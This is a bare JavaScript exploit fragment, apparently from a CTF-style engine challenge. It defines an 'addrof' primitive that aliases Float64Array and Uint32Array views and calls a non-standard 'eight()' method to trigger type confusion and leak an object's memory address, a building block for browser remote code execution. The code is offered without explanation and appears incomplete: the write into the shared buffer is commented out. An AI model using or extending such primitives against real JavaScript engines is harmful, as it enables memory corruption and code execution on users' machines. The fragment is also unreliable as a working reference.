let bits = new ArrayBuffer(1000);
let floatview = new Float64Array(bits);
let bitview = new Uint32Array(bits);

let addrof = function(obj){
    let first = {"int" : 420, "object" : obj};
    first.eight();
    let second = {"val" : first.int, "floattag" : 7};
    second.eight();
    //floatview[0] = second.val;
    first.eight();
    second.eight();
    return (bitview[1] * (1 << 16) * (1 << 16)) + bitview[0];
};
